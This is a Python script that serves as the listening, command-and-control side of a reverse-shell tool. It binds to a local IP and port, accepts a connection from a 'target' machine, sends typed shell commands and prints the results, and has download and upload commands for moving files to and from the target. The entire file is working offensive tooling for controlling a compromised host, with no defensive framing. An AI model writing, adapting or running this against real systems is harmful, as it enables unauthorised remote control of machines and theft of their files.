import socket  # Import socket module for network communication
import termcolor  # Import termcolor module for colored terminal output
import json  # Import json module to handle JSON data
import os  # Import os module for operating system interactions

def reliable_send(data):
    """ Function to reliably send data over the network."""
    jsondata = json.dumps(data)  # Convert data to JSON format
    target.send(jsondata.encode())  # Send encoded JSON data

def reliable_recv():
    """ Function to reliably receive data over the network."""
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()  # Receive data in chunks
            return json.loads(data)  # Convert JSON data to Python object
        except ValueError:
            continue  # Continue receiving data if JSON is not complete

def download_file(file_name):
    """ Function to download a file from the target machine."""
    f = open(file_name, 'wb')  # Open file in write-binary mode
    target.settimeout(1)  # Set timeout for the socket
    while True:
        try:
            chunk = target.recv(1024)  # Receive data in chunks
            if not chunk:
                break  # Exit the loop if no more data is received
            f.write(chunk)  # Write the received data to the file
        except socket.timeout:
            break  # Exit the loop if a timeout occurs
    target.settimeout(None)  # Remove the timeout
    f.close()  # Close the file

def upload_file(file_name):
    """ Function to upload a file to the target machine."""
    f = open(file_name, 'rb')  # Open file in read-binary mode
    target.send(f.read())  # Read and send file data
    f.close()

def target_communication():
    """ Function to handle communication with the target."""
    while True:
        command = input('* Shell~%s: ' % str(ip))  # Get command input from user
        reliable_send(command)  # Send command to target
        if command == 'exit':
            break  # Exit the loop
        elif command[:3] == 'cd ':
            pass  # Change directory on target
        elif command[:8] == 'download':
            download_file(command[9:])  # Download file from target
        elif command[:6] == 'upload':
            upload_file(command[7:])  # Upload file to target
        elif command == 'clear':
            os.system('clear')  # Clear the terminal screen
        else:
            result = reliable_recv()  # Receive command result
            print(result)  
try: 
# Setup the server
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
    sock.bind(('192.168.31.108', 5555))  # Bind to the IP and port
    print('[+] Listening For The Incoming Connections')
    sock.listen(5)  # Listen for incoming connections
    target, ip = sock.accept()  # Accept a connection
    print('[+] Target Connected From: ' + str(ip))
    target_communication()  # Start communication with the target
    target.close()
except Exception as e:
    print(termcolor.colored(f"An error occurred: {e}", 'red'))
finally:
    sock.close() 